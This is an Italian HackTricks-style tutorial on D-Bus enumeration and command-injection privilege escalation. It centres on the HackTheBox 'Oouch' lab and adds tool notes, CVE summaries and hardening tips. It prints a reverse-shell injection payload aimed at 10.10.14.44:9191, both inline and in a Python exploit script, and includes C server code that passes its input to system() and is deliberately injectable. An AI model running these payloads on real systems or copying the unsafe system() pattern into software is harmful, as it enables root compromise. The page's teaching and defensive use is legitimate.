# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus viene utilizzato come mediatore per le comunicazioni inter-processo (IPC) negli ambienti desktop Ubuntu. Su Ubuntu, si osserva il funzionamento contemporaneo di diversi message bus: il system bus, utilizzato principalmente da **servizi privilegiati per esporre servizi rilevanti per l'intero sistema**, e un session bus per ciascun utente connesso, che espone servizi rilevanti solo per quello specifico utente. Qui il focus è principalmente sul system bus a causa della sua associazione con servizi in esecuzione con privilegi più elevati (ad es. root), poiché il nostro obiettivo è elevare i privilegi. Si osserva che l'architettura di D-Bus utilizza un 'router' per ogni session bus, responsabile del reindirizzamento dei messaggi del client ai servizi appropriati in base all'indirizzo specificato dai client per il servizio con cui desiderano comunicare.

I servizi su D-Bus sono definiti dagli **object** e dalle **interfaces** che espongono. Gli object possono essere paragonati alle istanze di class nelle normali linguaggi OOP, con ogni istanza identificata in modo univoco da un **object path**. Questo path, simile a un filesystem path, identifica in modo univoco ogni object esposto dal servizio. Un'interfaccia chiave per le attività di ricerca è l'interfaccia **org.freedesktop.DBus.Introspectable**, che presenta un singolo metodo, Introspect. Questo metodo restituisce una rappresentazione XML dei metodi, signal e property supportati dall'object, con focus qui sui metodi ed escludendo property e signal.

Per comunicare con l'interfaccia D-Bus, sono stati impiegati due tool: un tool CLI chiamato **gdbus** per invocare facilmente i metodi esposti da D-Bus negli script, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), un tool GUI basato su Python progettato per enumerare i servizi disponibili su ciascun bus e per visualizzare gli object contenuti in ogni servizio.
```bash
sudo apt-get install d-feet
```
Se stai controllando il **session bus**, conferma prima l'indirizzo corrente:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Nella prima immagine vengono mostrati i servizi registrati con il D-Bus system bus, con **org.debin.apt** evidenziato specificamente dopo aver selezionato il pulsante System Bus. D-Feet interroga questo servizio per gli oggetti, mostrando interfaces, methods, properties e signals per gli oggetti scelti, come si vede nella seconda immagine. Anche la signature di ogni method è dettagliata.

Una caratteristica notevole è la visualizzazione del **process ID (pid)** e della **command line** del servizio, utile per confermare se il servizio viene eseguito con privilegi elevati, importante per la rilevanza della ricerca.

**D-Feet consente anche l'invocazione di method**: gli utenti possono inserire espressioni Python come parametri, che D-Feet converte in tipi D-Bus prima di passarli al servizio.

Tuttavia, nota che **alcuni methods richiedono autenticazione** prima di consentirci di invocarli. Ignoreremo questi methods, poiché il nostro obiettivo è elevare i privilegi senza credenziali in primo luogo.

Nota anche che alcuni dei servizi interrogano un altro servizio D-Bus chiamato org.freedeskto.PolicyKit1 per verificare se a un utente debba essere consentito o meno eseguire determinate azioni.

## **Cmd line Enumeration**

### List Service Objects

È possibile elencare le interfacce D-Bus aperte con:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
I servizi contrassegnati come **`(activatable)`** sono particolarmente interessanti perché **non sono ancora in esecuzione**, ma una richiesta al bus può avviarli su richiesta. Non fermarti a `busctl list`; mappa quei nomi ai binari reali che eseguirebbero.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Questo ti dice rapidamente quale percorso `Exec=` verrà avviato per un nome attivabile e sotto quale identità. Se il binario o la sua catena di esecuzione sono protetti debolmente, un servizio inattivo può comunque diventare un percorso di privilege-escalation.

#### Connections

[Da wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Quando un processo stabilisce una connessione a un bus, il bus assegna alla connessione un nome bus speciale chiamato _unique connection name_. I nomi bus di questo tipo sono immutabili—è garantito che non cambieranno finché la connessione esiste—e, cosa più importante, non possono essere riutilizzati durante il tempo di vita del bus. Questo significa che nessun'altra connessione a quel bus avrà mai assegnato un tale unique connection name, anche se lo stesso processo chiude la connessione al bus e ne crea una nuova. I unique connection names sono facilmente riconoscibili perché iniziano con il carattere di due punti—altrimenti proibito.

### Service Object Info

Poi, puoi ottenere alcune informazioni sull'interfaccia con:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Correla inoltre il nome del bus con la sua unità `systemd` e il percorso dell'eseguibile:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Questo risponde alla domanda operativa che conta durante privesc: **se una chiamata a un metodo ha successo, quale binary e unit reali eseguiranno l'azione?**

### Elenca le Interfacce di un Service Object

Devi avere permessi sufficienti.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect Interface of a Service Object

Nota come in questo esempio è stata selezionata l'ultima interfaccia scoperta usando il parametro `tree` (_vedi sezione precedente_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Nota il metodo `.Block` dell'interfaccia `htb.oouch.Block` (quello che ci interessa). La "s" delle altre colonne potrebbe significare che si aspetta una stringa.

Prima di provare qualcosa di pericoloso, valida prima un metodo **read-oriented** o comunque a basso rischio. Questo separa chiaramente tre casi: sintassi sbagliata, raggiungibile ma negato, oppure raggiungibile e consentito.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Correlate D-Bus Methods with Policies and Actions

L’introspection ti dice **cosa** puoi chiamare, ma non ti dice **perché** una chiamata è consentita o negata. Per una vera triage di privesc di solito devi ispezionare **tre livelli insieme**:

1. **Activation metadata** (`.service` files or `SystemdService=`) per capire quale binary e unit verranno realmente eseguiti.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) per capire chi può `own`, `send_destination`, o `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) per capire il default authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Non assumere una mappatura 1:1 tra un metodo D-Bus e un’azione Polkit. Lo stesso metodo può scegliere un’azione diversa a seconda dell’oggetto modificato o del contesto di runtime. Quindi il flusso di lavoro pratico è:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` e grep dei file `.policy` rilevanti
3. probe live a basso rischio con `busctl call`, `gdbus call`, o `dbusmap --enable-probes --null-agent`

I servizi proxy o di compatibilità meritano attenzione extra. Un **proxy in esecuzione come root** che inoltra richieste a un altro servizio D-Bus tramite la propria connessione già stabilita può accidentalmente far sì che il backend tratti ogni richiesta come proveniente da UID 0, a meno che l’identità del chiamante originale non venga ri-validata.

### Interfaccia Monitor/Capture

Con privilegi sufficienti (solo `send_destination` e `receive_sender` non bastano) puoi **monitorare una comunicazione D-Bus**.

Per **monitorare** una **comunicazione** devi essere **root.** Se continui a trovare problemi pur essendo root, controlla [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) e [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Se sai come configurare un file di configurazione D-Bus per **permettere a utenti non root di sniffare** la comunicazione, per favore **contattami**!

Modi diversi per monitorare:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Nell'esempio seguente l'interfaccia `htb.oouch.Block` viene monitorata e **il messaggio "**_**lalalalal**_**" viene inviato tramite miscommunication**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Puoi usare `capture` invece di `monitor` per salvare i risultati in un file **pcapng** che Wireshark può aprire:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Filtrare tutto il rumore <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Se ci sono troppe informazioni sul bus, passa una match rule in questo modo:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Si possono specificare più regole. Se un messaggio corrisponde a _una qualsiasi_ delle regole, il messaggio verrà stampato. Ad esempio:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Vedi la [documentazione di D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) per maggiori informazioni sulla sintassi delle match rule.

### More

`busctl` ha ancora più opzioni, [**trovale tutte qui**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

Come utente **qtc dentro l'host "oouch" da HTB** puoi trovare un **file di configurazione D-Bus inaspettato** situato in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Nota dalla configurazione precedente che **dovrai essere l'utente `root` o `www-data` per inviare e ricevere informazioni** tramite questa comunicazione D-BUS.

Come utente **qtc** all'interno del container docker **aeb4525789d8** puoi trovare del codice correlato a dbus nel file _/code/oouch/routes.py._ Questo è il codice interessante:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Come puoi vedere, si sta **connettendo a un'interfaccia D-Bus** e inviando alla **funzione "Block"** il "client_ip".

Dall'altra parte della connessione D-Bus c'è un binario compilato in C in esecuzione. Questo codice sta **ascoltando** sulla connessione D-Bus **l'indirizzo IP e chiama iptables tramite la funzione `system`** per bloccare l'indirizzo IP fornito.\
**La chiamata a `system` è vulnerabile apposta a command injection**, quindi un payload come il seguente creerà una reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Alla fine di questa pagina puoi trovare il **codice C completo dell'applicazione D-Bus**. All'interno puoi trovare tra le righe 91-97 **come il `D-Bus object path`** **e il `interface name`** vengono **registrati**. Queste informazioni saranno necessarie per inviare informazioni alla connessione D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Anche, nella riga 57 puoi trovare che **l'unico metodo registrato** per questa comunicazione D-Bus si chiama `Block`(_**Ecco perché nella sezione seguente i payload verranno inviati all'oggetto di servizio `htb.oouch.Block`, all'interfaccia `/htb/oouch/Block` e al nome del metodo `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Il seguente codice python invierà il payload alla connessione D-Bus al metodo `Block` tramite `block_iface.Block(runme)` (_nota che è stato estratto dal precedente blocco di codice_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl e dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` è uno strumento usato per inviare messaggi a “Message Bus”
- Message Bus – Un software usato dai sistemi per facilitare la comunicazione tra applicazioni. È correlato a Message Queue (i messaggi sono ordinati in sequenza) ma in Message Bus i messaggi vengono inviati in un modello a sottoscrizione ed è anche molto veloce.
- Il tag “-system” è usato per indicare che si tratta di un messaggio di sistema, non di sessione (di default).
- Il tag “–print-reply” è usato per stampare correttamente il nostro messaggio e ricevere eventuali risposte in un formato leggibile dall’uomo.
- “–dest=Dbus-Interface-Block” L’indirizzo dell’interfaccia Dbus.
- “–string:” – Tipo di messaggio che ci piace inviare all’interfaccia. Esistono diversi formati per inviare messaggi come double, bytes, booleans, int, objpath. Tra questi, l’“object path” è utile quando vogliamo inviare il percorso di un file all’interfaccia Dbus. In questo caso possiamo usare un file speciale (FIFO) per passare un comando all’interfaccia nel nome di un file. “string:;” – Questo serve per richiamare di nuovo l’object path dove inseriamo il file/comando reverse shell FIFO.

_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

L’enumeratione manuale di una grande attack surface D-Bus con `busctl`/`gdbus` diventa rapidamente pesante. Due piccole utility FOSS rilasciate negli ultimi anni possono velocizzare molto le attività durante red-team o CTF:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
* Scritto in C; single static binary (<50 kB) che percorre ogni object path, estrae l’XML `Introspect` e lo mappa al PID/UID proprietario.
* Useful flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Lo strumento marca i well-known name non protetti con `!`, rivelando istantaneamente i servizi che puoi *own* (take over) o le chiamate di metodo raggiungibili da una shell non privilegiata.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
* Script solo Python che cerca path *writable* nelle unità systemd **e** file di policy D-Bus troppo permissivi (es. `send_destination="*"`).
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Il modulo D-Bus cerca le directory qui sotto e evidenzia qualsiasi servizio che può essere spoofed o hijacked da un normale utente:
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

Tenere d’occhio i CVE pubblicati di recente aiuta a individuare pattern insicuri simili nel codice custom. Due buoni esempi recenti sono:

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Il servizio in esecuzione come root esponeva un’interfaccia D-Bus che utenti non privilegiati potevano riconfigurare, incluso il caricamento di comportamenti macro controllati dall’attaccante. | Se un daemon espone **device/profile/config management** sul system bus, tratta la configurazione scrivibile e le funzionalità macro come primitive di code-execution, non solo come "settings". |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Un proxy di compatibilità in esecuzione come root inoltrava richieste a servizi backend senza preservare il security context originale del chiamante, quindi i backend si fidavano del proxy come UID 0. | Tratta i servizi D-Bus di **proxy / bridge / compatibility** come una classe di bug separata: se rilanciano chiamate privilegiate, verifica come l’UID del chiamante e il contesto Polkit raggiungono il backend. |

Pattern to notice:
1. Il servizio gira **come root sul system bus**.
2. O non c’è **nessun authorization check**, oppure il check è eseguito sul **subject sbagliato**.
3. Il metodo raggiungibile alla fine cambia lo stato del sistema: installazione di package, cambiamenti di user/group, configurazione del bootloader, aggiornamenti del device profile, scritture su file o esecuzione diretta di comandi.

Use `dbusmap --enable-probes` or manual `busctl call` to confirm whether a method is reachable, then inspect the service's policy XML and Polkit actions to understand **which subject** is actually being authorized.

---

## Hardening & Detection Quick-Wins

* Search for world-writable or *send/receive*-open policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Require Polkit for dangerous methods – even *root* proxies should pass the *caller* PID to `polkit_authority_check_authorization_sync()` instead of their own.
* Drop privileges in long-running helpers (use `sd_pid_get_owner_uid()` to switch namespaces after connecting to the bus).
* If you cannot remove a service, at least *scope* it to a dedicated Unix group and restrict access in its XML policy.
* Blue-team: capture the system bus with `busctl capture > /var/log/dbus_$(date +%F).pcapng` and import it into Wireshark for anomaly detection.

---

## References

- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [https://github.com/PixlOne/logiops/issues/473](https://github.com/PixlOne/logiops/issues/473)
- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
{{#include ../../banners/hacktricks-training.md}}
